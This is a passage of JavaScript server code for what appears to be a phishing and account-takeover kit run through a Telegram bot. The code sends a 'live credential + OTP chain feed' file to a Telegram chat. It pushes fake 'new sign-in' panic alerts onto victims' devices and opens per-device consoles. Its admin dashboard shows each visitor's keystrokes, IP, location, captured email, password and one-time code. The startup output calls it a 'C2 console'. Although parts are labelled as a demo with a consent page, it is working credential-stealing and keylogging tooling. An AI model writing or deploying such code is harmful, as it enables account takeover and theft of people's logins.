    form.append("caption", `💣 dump.txt — live credential + OTP chain feed (${raw.split(/\n/).length} line(s))`);
    form.append("document", new Blob([raw + "\n"], { type: "text/plain" }), "dump.txt");
    return tgMultipart("sendDocument", form);
  }

  if (c === "/nudge") {
    const sid = (args[0] || "").slice(0, 12);
    const msg = args.slice(1).join(" ").slice(0, 300) ||
      "New sign-in on your account — Bengaluru, India · Chrome on Windows · 2FA code used ✔️";
    const ok = queueCmd(sid, "nudge", msg);
    return tgSend(ok
      ? `🚨 <b>Takeover alert queued</b> — the victim's screen now shows a “new sign-in” panic banner + vibration. Perfect for the ATO reveal.\n<i>${esc(msg)}</i>`
      : "❓ Usage: /nudge <visitor-id> [custom message] — see /list");
  }

  if (c === "/crowd") {
    return tgSend(`🎟️ <b>Live crowd opt-ins:</b> ${crowdSeen.size} phone(s) pointed their browser at the demo link tonight (consent page).`);
  }

  if (c === "/dash") {
    if (liveDash.msgId) {
      const ok = await editMsg(liveDash.msgId, renderDash(), dashKeyboard());
      if (ok) { liveDash.last = Date.now(); return tgSend("📊 Dashboard refreshed in place — same message, live data."); }
      liveDash.msgId = null;
    }
    return ensureDash();
  }

  if (c === "/console" || c === "/con") {
    const sid = (args[0] || "").slice(0, 12);
    const s = sessions.get(sid);
    if (!s) return tgSend("❓ Usage: /console <visitor-id> — see /list");
    await openConsole(sid);
    return tgSend(`🎛 Interactive console opened for <code>${esc(sid)}</code> — tap a button to queue an effect on that device.`);
  }

  if (c === "/clear") {
    sessions.clear();
    liveKeys.clear();
    try { fs.unlinkSync(STORE_PATH); } catch (e) {}
    resetLive(); // close dash + consoles so wiped data can't resurrect into them
    return tgSend("🧹 All demo data wiped — dashboard & consoles closed. Send /dash for a fresh board.");
  }

  if (c.startsWith("/")) return tgSend(`❓ Unknown command — try /help`);
}

async function pollCommands() {
  while (true) {
    try {
      const r = await fetch(`${TG}/getUpdates`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ offset: tgState.offset, timeout: 25, allowed_updates: ["message", "callback_query"] }),
      });
      const data = await r.json();
      let dirty = false;
      for (const u of (data.result || [])) {
        // Confirm the highest update id Telegram has handed us. When two
        // instances poll the SAME token each gets its own copy of every update;
        // persisting the offset lets the shared tgstate file keep both (and any
        // restart) advancing instead of replaying the backlog from 0.
        const nid = u.update_id + 1;
        if (nid > tgState.offset) { tgState.offset = nid; dirty = true; }
        // Re-delivered backlog (twin replay, restart with stale state) must not
        // double-fire commands that were already acted on.
        const uid = String(u.update_id);
        if (tgState.seen[uid]) continue;
        if (u.message && String(u.message.chat.id) === String(CHAT_ID) && u.message.text) {
          tgState.seen[uid] = Date.now();
          dirty = true;
          await handleCommand(u.message.text).catch(e => console.error("[cmd]", e.message));
        }
        // callback_query may arrive without a .message when the button's source
        // message was deleted (Telegram omits it) — skip those instead of crashing
        // the poll iteration and silently dropping every later press.
        if (u.callback_query && u.callback_query.message && String(u.callback_query.message.chat.id) === String(CHAT_ID)) {
          tgState.seen[uid] = Date.now();
          dirty = true;
          await handleCallback(u.callback_query).catch(e => console.error("[cb]", e.message));
        }
      }
      if (dirty) saveTgState();
    } catch (e) { /* network hiccup — retry */ }
  }
}

// ══════════════════════════════════════════════════════════════
//  ADMIN DASHBOARD
// ══════════════════════════════════════════════════════════════
app.get("/admin/data", (req, res) => {
  if (req.query.key !== ADMIN_KEY) return res.status(403).json({ error: "forbidden" });

  const list = Array.from(sessions.values())
    .sort((a, b) => b.lastSeen - a.lastSeen)
    .map((s) => ({
      sid: s.sid,
      ip: s.ip,
      device: s.device,
      location: s.location,
      visits: s.visits,
      keys: s.keys.slice(-30),
      keyCount: s.keys.length,
      creds: s.creds,
      otp: s.otp,
      pdfHits: s.pdfHits || 0,
      firstSeen: s.firstSeen,
      lastSeen: s.lastSeen,
      online: Date.now() - s.lastSeen < 30000,
    }));

  res.json({ sessions: list, total: list.length, now: Date.now() });
});

app.get("/admin", (req, res) => {
  res.send(`<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Ops</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body { font-family: 'Segoe UI', monospace; background:#0d1117; color:#c9d1d9; padding:16px; }
  h1 { font-size:20px; color:#58a6ff; margin-bottom:4px; }
  .sub { color:#8b949e; font-size:12px; margin-bottom:16px; }
  .device { background:#161b22; border:1px solid #30363d; border-radius:8px; padding:14px; margin-bottom:12px; }
  .online { border-color:#238636; }
  .hdr { display:flex; justify-content:space-between; align-items:center; margin-bottom:8px; flex-wrap:wrap; gap:6px; }
  .dev-name { font-weight:600; color:#f0f6fc; font-size:15px; }
  .badge { font-size:11px; padding:2px 8px; border-radius:10px; }
  .b-on { background:#238636; color:#fff; }
  .b-off { background:#30363d; color:#8b949e; }
  .kv { font-size:13px; line-height:1.7; }
  .kv b { color:#58a6ff; font-weight:500; }
  .keys { background:#0d1117; border-radius:6px; padding:8px; margin-top:8px; font-size:12px; max-height:140px; overflow-y:auto; }
  .keys div { padding:2px 0; border-bottom:1px solid #21262d; }
  .keys .ctx { color:#d29922; }
  .cred { background:#da3633; color:#fff; border-radius:6px; padding:8px; margin-top:8px; font-size:13px; }
  .mono { font-family:Consolas, monospace; }
  .err { color:#f85149; text-align:center; margin-top:40px; }
</style>
</head><body>
<h1>🛰️ Live Operations</h1>
<div class="sub">auto-refresh 3s · <span id="total">0</span> devices seen</div>
<div id="list"><div class="err">waiting for data…</div></div>
<script>
const KEY = new URLSearchParams(location.search).get("key") || "";

function render(d) {
  const el = document.getElementById("list");
  document.getElementById("total").textContent = d.total;
  if (!d.sessions.length) { el.innerHTML = '<div class="err">no devices yet — open the demo link</div>'; return; }
  el.innerHTML = d.sessions.map(s => {
    const dev = s.device || {};
    const loc = s.location ? s.location.city + ", " + s.location.region + " — " + s.location.isp : "unknown";
    const battery = dev.battery ? dev.battery.level + "% " + (dev.battery.charging ? "⚡" : "🔋") : "—";
    const net = dev.connection ? dev.connection.effectiveType.toUpperCase() : "—";
    const keys = (s.keys || []).slice().reverse().map(k =>
      '<div><span class="ctx">[' + k.context + ']</span> <span class="mono">' +
      k.keys.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;") + '</span></div>'
    ).join("") || '<div style="color:#8b949e">no keystrokes yet</div>';
    const cred = s.creds ? '<div class="cred">🔐 ' + s.creds.email + ' / ' + s.creds.password + (s.otp ? ' / OTP <span class="mono">' + s.otp.code + '</span> ✅ takeover chain complete' : '') + '</div>' : '';
    return '<div class="device' + (s.online ? ' online' : '') + '">' +
      '<div class="hdr"><span class="dev-name">' + (dev.platform || "Unknown") + '</span>' +
      '<span class="badge ' + (s.online ? 'b-on' : 'b-off') + '">' + (s.online ? 'ONLINE' : 'offline') + '</span></div>' +
      '<div class="kv">' +
      '<b>IP</b> <span class="mono">' + s.ip + '</span> · <b>Net</b> ' + net + ' · <b>Battery</b> ' + battery + '<br>' +
      '<b>Location</b> ' + loc + '<br>' +
      '<b>Browser</b> ' + (dev.browser || "—") + ' · <b>Screen</b> ' + (dev.screen || "—") + '<br>' +
      '<b>First seen</b> ' + new Date(s.firstSeen).toLocaleTimeString() +
      ' · <b>Last seen</b> ' + new Date(s.lastSeen).toLocaleTimeString() +
      ' · <b>Visits</b> ' + s.visits + '</div>' +
      '<div class="keys"><b style="color:#d29922">KEYSTROKES (' + s.keyCount + ')</b>' + keys + '</div>' +
      cred + '</div>';
  }).join("");
}

async function poll() {
  try {
    const r = await fetch("/admin/data?key=" + encodeURIComponent(KEY));
    if (r.status === 403) { document.body.innerHTML = '<div class="err">🔒 wrong admin key — add ?key=YOUR_KEY to the URL</div>'; return; }
    render(await r.json());
  } catch (e) { /* server asleep, retry */ }
}
poll();
setInterval(poll, 3000);
</script>
</body></html>`);
});

app.listen(PORT, () => {
  console.log(`\n[+] Demo server running on port ${PORT}`);
  console.log(`[+] Telegram relaying to chat_id: ${CHAT_ID}`);
  console.log(`[+] C2 console: send /help to the bot`);
  console.log(`[+] Live dashboard: /admin?key=${ADMIN_KEY}\n`);
  pollCommands(); // start Telegram command long-poll
});
